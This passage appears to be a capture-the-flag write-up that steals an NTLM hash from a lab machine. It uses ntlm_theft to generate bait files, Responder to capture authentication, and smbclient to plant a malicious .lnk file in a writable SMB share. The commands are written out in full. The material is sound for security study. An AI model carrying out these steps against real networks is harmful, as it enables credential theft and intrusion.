While you are on SMB realize that the files here are being renamed or replaced. This means that a user accesses this share regularly. 
Since the file names are changing we can come to an assumption that someone might be accessing the contents in the `**onboarding**` directory. Let's try to make use of this to steal a `**NTLM**` hash of the user that might be making the changes within the share.

We also note that we have write access to the share.

## NTLM Theft

A tool for generating multiple types of NTLMv2 hash theft files.

ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.  More [info](https://github.com/Greenwolf/ntlm_theft).

You can see an example [here](https://www.hackingarticles.in/multiple-files-to-capture-ntlm-hashes-ntlm-theft/).

- Install ntlm_theft.
- Run the following code:
	`python3 ntlm_theft.py -g all -s \<MACHINE IP\> -f 0xb0b`
	The -f option will place all of them in the folder you choose.

	![[Screenshot from 2024-08-09 19-27-58.png]]
-  List the files created.
	 `cd 0xb0b`
	 `ls`
	![[Screenshot from 2024-08-09 19-45-02.png]]
## Responder

Responder is a powerful hacking tool used in penetration testing and security assessments. It's designed to listen for specific network traffic, particularly LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) requests. When a device on the network tries to resolve a hostname, such as through a mistyped URL or accessing a non-existent resource, it may send out these requests.

Responder intercepts these requests and responds with fake or spoofed responses, tricking the requesting device into sending authentication credentials. This is particularly effective in environments where NTLMv1/NTLMv2 authentication is prevalent.

- Set up a responder on the eth0 interface on your attacking machine.
	`sudo responder -I tun0`
	
	![[Screenshot from 2024-08-09 19-40-55.png]]

- Upload the `*.lnk` file in `/Data/onboarding`.
	`smbclient \\\\MACHINE IP\\data -U ""`
		`smb: \> cd onboarding\`
		`smb: \onboarding\> put 0xb0b.lnk`
		`smb: \onboarding\> ls`

		![[Screenshot from 2024-08-09 19-52-45.png]]
After a short time, we get the hash of the user `AUTOMATE` in Responder.